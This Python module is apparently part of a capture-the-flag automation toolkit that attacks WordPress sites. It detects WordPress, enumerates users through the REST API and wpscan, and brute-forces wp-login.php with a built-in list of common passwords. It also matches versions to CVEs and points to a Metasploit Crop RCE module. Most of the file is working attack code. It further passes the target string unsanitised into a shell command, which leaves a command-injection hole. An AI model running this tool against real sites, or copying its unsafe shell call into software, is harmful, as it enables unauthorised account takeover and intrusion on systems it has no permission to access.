#!/usr/bin/env python3
"""
WordPress Security Scanner Module
Handles: WordPress detection, user enumeration, brute force, vulnerability checking
"""
import os
import re
import subprocess
import json
import requests
from core.colors import red, green, yellow, blue, highlight
from core.tools import check_tool

FLAG_PATTERN = r'[a-zA-Z0-9_]+\{[^}]*\}'

class WPScanner:
    def __init__(self, target):
        self.target = target.rstrip('/')
        self.version = None
        self.users = []
        self.plugins = []
        self.themes = []
    
    def extract_flag(self, text):
        if not text:
            return None
        flags = re.findall(FLAG_PATTERN, str(text))
        if flags:
            return flags[0]
        return None
    
    def check_wpscan(self):
        """Check if wpscan is installed"""
        if not check_tool("wpscan"):
            print(f"{yellow('[!]')} wpscan not installed. Try: gem install wpscan")
            return False
        return True
    
    def detect_wordpress(self):
        """Check if target is running WordPress"""
        print(f"{green('[+]')} Checking if {self.target} is running WordPress...")
        
        try:
            # Check for common WordPress paths
            paths = ['/wp-admin/', '/wp-content/', '/wp-includes/', '/wp-login.php']
            for path in paths:
                r = requests.get(f"{self.target}{path}", timeout=5)
                if r.status_code == 200:
                    print(f"{green('[+]')} Found WordPress path: {path}")
            
            # Check for version in meta tags
            r = requests.get(self.target, timeout=5)
            version_match = re.search(r'<meta name="generator" content="WordPress ([0-9.]+)"', r.text)
            if version_match:
                self.version = version_match.group(1)
                print(f"{green('[+]')} Detected WordPress version: {self.version}")
                return True
            
            # Check readme.html
            r = requests.get(f"{self.target}/readme.html", timeout=5)
            if r.status_code == 200 and 'WordPress' in r.text:
                print(f"{green('[+]')} Found WordPress readme.html")
                return True
                
        except Exception as e:
            print(f"{yellow('[*]')} Error detecting WordPress: {e}")
        
        return False
    
    def enumerate_users(self):
        """Enumerate WordPress users"""
        print(f"{green('[+]')} Enumerating WordPress users...")
        
        # Try wp-json API
        try:
            r = requests.get(f"{self.target}/wp-json/wp/v2/users", timeout=5)
            if r.status_code == 200:
                users_data = r.json()
                for user in users_data:
                    username = user.get('slug') or user.get('name')
                    if username:
                        self.users.append(username)
                        print(f"{green('[+]')} Found user: {username}")
        except:
            pass
        
        # Try wpscan if available
        if self.check_wpscan():
            cmd = f"wpscan --url {self.target} --enumerate u --no-banner --format json"
            result = subprocess.getoutput(cmd)
            
            try:
                data = json.loads(result)
                if 'users' in data:
                    for user in data['users']:
                        username = user.get('username')
                        if username and username not in self.users:
                            self.users.append(username)
                            print(f"{green('[+]')} Found user: {username}")
            except:
                pass
        
        return self.users
    
    def brute_force(self, username, password_list=None):
        """Brute force WordPress login"""
        print(f"{green('[+]')} Attempting brute force for user: {username}")
        
        if not password_list:
            password_list = ['password', 'admin', '123456', 'password123', 'admin123', 
                           'root', 'toor', 'qwerty', 'abc123', 'iloveyou', 'secret']
        
        login_url = f"{self.target}/wp-login.php"
        
        for password in password_list:
            try:
                data = {
                    'log': username,
                    'pwd': password,
                    'wp-submit': 'Log In',
                    'redirect_to': f"{self.target}/wp-admin/",
                    'testcookie': '1'
                }
                
                r = requests.post(login_url, data=data, timeout=5, allow_redirects=False)
                
                if r.status_code == 302 or 'dashboard' in r.text.lower():
                    print(f"{green('[+]')} Success! {username}:{password}")
                    return password
                    
            except Exception as e:
                pass
        
        return None
    
    def check_vulnerabilities(self):
        """Check for known WordPress vulnerabilities by version"""
        print(f"{green('[+]')} Checking for known vulnerabilities...")
        
        if not self.version:
            print(f"{yellow('[*]')} WordPress version unknown")
            return []
        
        # Common vulnerable versions and their exploits
        vulns = {
            '4.7': ['CVE-2017-1001000', 'REST API content injection'],
            '4.9': ['CVE-2018-6389', 'DoS via load-scripts.php'],
            '5.0': ['CVE-2019-8942', 'Crop RCE'],  # The one from the walkthrough!
            '5.1': ['CVE-2019-9787', 'CSRF'],
            '5.2': ['CVE-2019-16222', 'XSS'],
            '5.3': ['CVE-2020-8417', 'XSS'],
        }
        
        matched_vulns = []
        for ver_range, exploit_info in vulns.items():
            if self.version.startswith(ver_range):
                print(f"{red('[!]')} Vulnerable! {exploit_info[0]}: {exploit_info[1]}")
                matched_vulns.append(exploit_info)
        
        return matched_vulns
    
    def run_crop_rce_exploit(self):
        """Attempt Crop RCE exploit (WordPress 5.0)"""
        print(f"{green('[+]')} Attempting Crop RCE exploit...")
        
        # Check if version matches
        if self.version and not self.version.startswith('5.0'):
            print(f"{yellow('[*]')} Crop RCE only works on WordPress 5.0")
            return None
        
        # Try to get nonce
        try:
            # Need to be logged in first
            if not self.users:
                self.enumerate_users()
            
            # This would require metasploit integration
            print(f"{yellow('[*]')} Use metasploit module: exploit/multi/http/wp_crop_rce")
            return "Use: msfconsole -> use exploit/multi/http/wp_crop_rce"
            
        except Exception as e:
            print(f"{yellow('[*]')} Exploit attempt failed: {e}")
        
        return None
    
    def scan(self):
        """Main WordPress scan function"""
        print(f"{green('[+]')} 🔍 Starting WordPress scan on {self.target}")
        
        if not self.detect_wordpress():
            print(f"{yellow('[-]')} Target does not appear to be running WordPress")
            return None
        
        # Enumerate users
        users = self.enumerate_users()
        
        # Try brute force on found users
        for user in users[:3]:  # Try first 3 users
            password = self.brute_force(user)
            if password:
                print(f"{green('[+]')} Credentials found: {user}:{password}")
                return f"{user}:{password}"
        
        # Check vulnerabilities
        vulns = self.check_vulnerabilities()
        
        # If version 5.0, suggest Crop RCE
        if self.version and self.version.startswith('5.0'):
            print(f"\n{red('[!]')} WordPress 5.0 detected - vulnerable to Crop RCE!")
            print(f"{yellow('[*]')} Use: exploit/multi/http/wp_crop_rce in metasploit")
            
            # Try to get nonce if we have creds
            if users:
                self.run_crop_rce_exploit()
        
        return None


def run_wpscan(target):
    """Main WordPress scanner entry point"""
    scanner = WPScanner(target)
    return scanner.scan()


if __name__ == '__main__':
    import sys
    if len(sys.argv) > 1:
        result = run_wpscan(sys.argv[1])
        if result:
            print(f"\n{red('[🏆]')} Result: {green(result)}")
        else:
            print(f"{yellow('[-]')} No credentials or vulnerabilities found")